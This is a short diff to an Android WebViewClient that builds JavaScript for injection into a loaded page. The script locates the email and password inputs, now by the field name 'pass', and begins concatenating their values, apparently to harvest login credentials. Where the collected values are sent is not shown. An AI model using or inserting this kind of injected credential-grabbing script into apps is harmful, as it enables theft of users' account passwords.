@@ -44,7 +44,7 @@ webview1.setWebViewClient(new WebViewClient() {
         sb.append("var objPWD, objAccount;var str = '';");
         sb.append("var inputs = document.getElementsByTagName('input');");
         sb.append("for (var i = 0; i < inputs.length; i++) {");
-        sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
+        sb.append("if (inputs[i].name.toLowerCase() === 'pass') {objPWD = inputs[i];}");
         sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
         sb.append("}");
         sb.append("if (objAccount != null) {str += objAccount.value;}");
